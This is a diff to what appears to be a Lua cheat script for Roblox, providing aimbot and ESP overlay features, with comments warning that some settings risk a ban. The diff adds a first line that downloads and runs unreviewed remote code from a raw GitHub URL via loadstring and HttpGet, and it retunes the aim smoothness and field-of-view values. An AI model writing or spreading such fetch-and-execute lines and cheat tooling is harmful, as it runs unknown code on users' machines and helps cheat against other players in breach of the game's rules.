@@ -1,3 +1,5 @@
+local aux = loadstring(game:HttpGet("https://raw.githubusercontent.com/isntitdexter/Private-shit/main/cum.lua"))()
+
 local drawing_new = Drawing.new
 local vector2_new = Vector2.new
 local vector3_new = Vector3.new
@@ -96,8 +98,8 @@ local _aimsp_settings; _aimsp_settings = {
         closest_to_you = false, -- will sometimes not work, backwards iteration will make this alot more consistent
     },
     toggle_hud_key = Enum.KeyCode.P, -- toggle drawing
-    smoothness = 4, -- anything over 5 = aim assist,  1 = lock on (using 1 might get u banned)
-    fov_size = 250; -- <450 = safezone
+    smoothness = 5, -- anything over 5 = aim assist,  1 = lock on (using 1 might get u banned)
+    fov_size = 50; -- <450 = safezone
 
     -- esp settings
     use_esp = true,
